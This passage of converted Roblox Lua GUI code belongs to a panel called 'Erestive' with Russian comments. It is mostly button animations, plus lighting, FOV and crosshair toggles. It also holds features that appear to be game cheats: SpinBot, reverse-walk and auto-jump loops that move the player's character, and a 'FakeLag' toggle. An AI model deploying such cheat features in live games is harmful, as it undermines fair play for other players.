			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_22c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Ambient.FOV.FOVConfig.SetFOV.Button.Animations
local function C_22d()
local script = G2L["22d"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_22d);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations
local function C_23b()
local script = G2L["23b"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_23b);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
local function C_23f()
local script = G2L["23f"];
	
	script.Parent.MouseButton1Click:Connect(function()
		-- remove
		-- Удаляем существующие эффекты освещения
		for _, obj in ipairs(game.Lighting:GetChildren()) do
			if obj.ClassName == "Sky" or obj.ClassName == "Atmosphere" or obj.Name == "Bloom" or obj.Name == "DepthOfField" or obj.Name == "SunRays" or obj.Name == "ColorCorrection" then
				obj:Destroy()
			end
		end
		
			 
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.23, 0),"In","Linear",0.1,true)
			wait(3)
			script.Parent.Parent.Parent.FOVSuccess:TweenPosition(UDim2.new(-1.042, 0,3.7, 0),"In","Linear",0.1,true)
	end)
end;
task.spawn(C_23f);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.Animations
local function C_240()
local script = G2L["240"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_240);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Animations
local function C_24f()
local script = G2L["24f"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_24f);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
local function C_253()
local script = G2L["253"];
	local function applyLightingSettings()
		local lighting = game.Lighting
	
		-- Удаляем существующие эффекты освещения
		for _, obj in ipairs(lighting:GetChildren()) do
			if obj.ClassName == "Sky" or obj.ClassName == "Atmosphere" or obj.Name == "Bloom" or obj.Name == "DepthOfField" or obj.Name == "SunRays" or obj.Name == "ColorCorrection" then
				obj:Destroy()
			end
		end
	
		wait(0.3)
	
		-- Добавляем новые элементы из Folder
		local folder = script.Parent.Parent.Folder -- Убедись, что название папки соответствует твоей структуре!
		for _, child in pairs(folder:GetChildren()) do
			if child.ClassName == "Sky" or child.ClassName == "Atmosphere" or child.Name == "Bloom" or child.Name == "ColorCorrection" or child.Name == "SunRays" or child.Name == "DepthOfField" then
				child:Clone().Parent = lighting
			end
		end
	end
	
	script.Parent.MouseButton1Click:Connect(applyLightingSettings)
end;
task.spawn(C_253);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.Animations
local function C_254()
local script = G2L["254"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_254);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Frame.night.FOVConfig.SetFOV.Button.LocalScript
local function C_255()
local script = G2L["255"];
	script.Parent.MouseEnter:Connect(function()
		script.Parent.ImageLabel.Visible = true
	end)
	script.Parent.MouseLeave:Connect(function()
		script.Parent.ImageLabel.Visible = false
	end)
end;
task.spawn(C_255);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Animations
local function C_26c()
local script = G2L["26c"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
end;
task.spawn(C_26c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Button.LocalScript
local function C_270()
local script = G2L["270"];
	local Lighting = game:GetService("Lighting")
	local TextBox = script.Parent.Parent.Parent.FOVSet
	
	script.Parent.MouseButton1Click:Connect(function()
		local percent = tonumber(TextBox.Text)
	
		if percent then
			percent = math.clamp(percent, 0, 100)
			local factor = (100 - percent) / 100 -- 0% = 1 (светло), 100% = 0 (темно)
	
			-- Основные настройки глобального освещения:
			Lighting.Brightness = 2 * factor -- Обычная яркость ~2
			Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5):Lerp(Color3.new(0, 0, 0), percent/100)
			Lighting.ClockTime = 14 - (percent * 0.12) -- Сдвигает время к вечеру (опционально)
	
			-- Если хочешь реальный "мрак", меняем экспозицию:
			Lighting.ExposureCompensation = - (percent / 20) -- Уходит в минус при росте %
	
			print("Мир затемнен на: " .. percent .. "%")
		else
			warn("Введи число в поле!")
		end
	end)
	
end;
task.spawn(C_270);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.Dark.FOV.FOVConfig.SetFOV.Button.Animations
local function C_271()
local script = G2L["271"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	local frame = script.Parent.Parent
	
	-- Button --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(255, 255, 255)
		TweenService:Create(frame, Info, {BackgroundColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(42, 42, 42)
		TweenService:Create(frame, Info, {BackgroundColor3 = ColorColor}):Play()
	end)
	
	-- Text --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(38, 38, 38)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.Parent.Text, Info, {TextColor3 = ColorColor}):Play()
	end)
end;
task.spawn(C_271);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
local function C_277()
local script = G2L["277"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_277);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
local function C_27c()
local script = G2L["27c"];
	local RunService = game:GetService("RunService")
	local player = game.Players.LocalPlayer
	local camera = workspace.CurrentCamera
	
	_G.ReverseWalk = false 
	
	local button = script.Parent
	button.Text = "Reverse: OFF"
	
	RunService.RenderStepped:Connect(function()
		local char = player.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChild("Humanoid")
	
		if _G.ReverseWalk and root and hum and hum.Health > 0 then
			if hum.MoveDirection.Magnitude > 0 then
				hum.AutoRotate = false
				local camLook = camera.CFrame.LookVector
				-- Поворачиваем только по горизонтали, чтобы не наклоняться в землю
				local targetCF = CFrame.lookAt(root.Position, root.Position - Vector3.new(camLook.X, 0, camLook.Z))
				root.CFrame = targetCF
			else
				hum.AutoRotate = true
			end
		end
	end)
	
	
	button.MouseButton1Click:Connect(function()
		_G.ReverseWalk = not _G.ReverseWalk
		button.Text = _G.ReverseWalk and "Reverse: ON" or "Reverse: OFF"
		button.BackgroundColor3 = _G.ReverseWalk and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
	end)
	
end;
task.spawn(C_27c);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
local function C_284()
local script = G2L["284"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_284);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
local function C_289()
local script = G2L["289"];
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local button = script.Parent
	local statusText = button:FindFirstChild("Value") -- Если у тебя есть BoolValue, иначе удали эту строку
	
	_G.SpinBot = false -- Изначально выключен
	local spinSpeed = 50 -- Скорость вращения
	
	-- 1. Логика кнопки
	button.MouseButton1Click:Connect(function()
		_G.SpinBot = not _G.SpinBot
	
		-- Обновляем текст и цвет кнопки
		button.Text = _G.SpinBot and "SpinBot: ON" or "SpinBot: OFF"
		button.BackgroundColor3 = _G.SpinBot and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
	end)
	
	-- 2. Логика вращения (всегда активна, но работает только если _G.SpinBot == true)
	RunService.Heartbeat:Connect(function()
		if _G.SpinBot then
			local char = player.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			local hum = char and char:FindFirstChild("Humanoid")
	
			if root and hum and hum.Health > 0 then
				-- Отключаем авто-поворот, чтобы персонаж не дергался
				hum.AutoRotate = false
				-- Вращаем CFrame
				root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
			end
		else
			-- Возвращаем нормальный поворот, если выключено
			local char = player.Character
			local hum = char and char:FindFirstChild("Humanoid")
			if hum then
				hum.AutoRotate = true
			end
		end
	end)
	
end;
task.spawn(C_289);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Animations
local function C_291()
local script = G2L["291"];
	local ms = game.Players.LocalPlayer:GetMouse()
	
	local btn = script.Parent.Button
	local sample = script:WaitForChild("Sample")
	
	script.Parent.Button.MouseButton1Click:Connect(function()
		
		local c = sample:Clone()
		c.Parent = btn
		local x, y = (ms.X - c.AbsolutePosition.X), (ms.Y - c.AbsolutePosition.Y)
		c.Position = UDim2.new(0, x, 0, y)
		local len, size = 0.35, nil
		if btn.AbsoluteSize.X >= btn.AbsoluteSize.Y then
			size = (btn.AbsoluteSize.X * 1.5)
		else
			size = (btn.AbsoluteSize.Y * 1.5)
		end
		c:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, (-size / 2), 0.5, (-size / 2)), 'Out', 'Quad', len, true, nil)
		for i = 1, 10 do
			c.ImageTransparency = c.ImageTransparency + 0.05
			wait(len / 12)
		end
		c:Destroy()
	end)
	
	script.Parent.MouseEnter:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
	end)
end;
task.spawn(C_291);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame2.RW.Slider.Button.server
local function C_296()
local script = G2L["296"];
	local RunService = game:GetService("RunService")
	local player = game:GetService("Players").LocalPlayer
	
	local Button = script.Parent -- Скрипт должен лежать внутри TextButton
	local jumpingEnabled = false
	
	-- Переключатель
	Button.MouseButton1Click:Connect(function()
		jumpingEnabled = not jumpingEnabled
		Button.Text = jumpingEnabled and "AutoJump: ON" or "AutoJump: OFF"
		Button.BackgroundColor3 = jumpingEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
	end)
	
	RunService.RenderStepped:Connect(function()
		if not jumpingEnabled then return end
	
		local character = player.Character
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	
		if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
			humanoid.Jump = true
		end
	end)
	
end;
task.spawn(C_296);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2a0()
local script = G2L["2a0"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.Keyboard.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.Keyboard.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.Keyboard.Visible = true
		end
	end)
end;
task.spawn(C_2a0);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2a1()
local script = G2L["2a1"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2a1);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2a5()
local script = G2L["2a5"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.NeverXText.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.NeverXText.Visible = false
			script.Parent.Parent.Parent.Parent.Parent.TopInformation.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.NeverXText.Visible = true
			script.Parent.Parent.Parent.Parent.Parent.TopInformation.Visible = true
		end
	end)
end;
task.spawn(C_2a5);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2a6()
local script = G2L["2a6"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2a6);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.LocalScript
local function C_2aa()
local script = G2L["2aa"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.aim1.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.aim1.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.aim1.Visible = true
		end
	end)
end;
task.spawn(C_2aa);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.CrosshairVisible1.Animations
local function C_2ab()
local script = G2L["2ab"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2ab);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2af()
local script = G2L["2af"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.Parent.Parent.Erestive:Destroy()
	end)
end;
task.spawn(C_2af);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2b0()
local script = G2L["2b0"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2b0);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2b4()
local script = G2L["2b4"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.bindsActive.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.bindsActive.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.bindsActive.Visible = true
		end
	end)
end;
task.spawn(C_2b4);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2b5()
local script = G2L["2b5"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2b5);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2b9()
local script = G2L["2b9"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.Keyboard.BackgroundTransparency == 1 then
			script.Parent.Parent.Parent.Parent.Parent.Keyboard.BackgroundTransparency = 0.3
		else
			script.Parent.Parent.Parent.Parent.Parent.Keyboard.BackgroundTransparency = 1
		end
	end)
end;
task.spawn(C_2b9);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2ba()
local script = G2L["2ba"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = ColorColor}):Play()
	end)
end;
task.spawn(C_2ba);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.LocalScript
local function C_2be()
local script = G2L["2be"];
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.Parent.Parent.Parent.FakeLag.Visible == true then
			script.Parent.Parent.Parent.Parent.Parent.FakeLag.Visible = false
		else
			script.Parent.Parent.Parent.Parent.Parent.FakeLag.Visible = true
		end
	end)
end;
task.spawn(C_2be);
-- StarterGui.Erestive.MainFrame.CommandFrame.Frame3.TextButton.Animations
local function C_2bf()
local script = G2L["2bf"];
	local TweenService = game:GetService("TweenService")
	local TweenSpeed = 0.1
	local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
	
	
	
	
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent, Info, {TextColor3 = Color}):Play()
	end)
	
	script.Parent.MouseLeave:Connect(function()
		local ColorColor = Color3.fromRGB(255, 255, 255)
		TweenService:Create(script.Parent, Info, {TextColor3 = ColorColor}):Play()
	end)
	-- Image --
	
	script.Parent.MouseEnter:Connect(function()
		local Color = Color3.fromRGB(152, 152, 152)
		TweenService:Create(script.Parent.UIStroke, Info, {Color = Color}):Play()
	end)
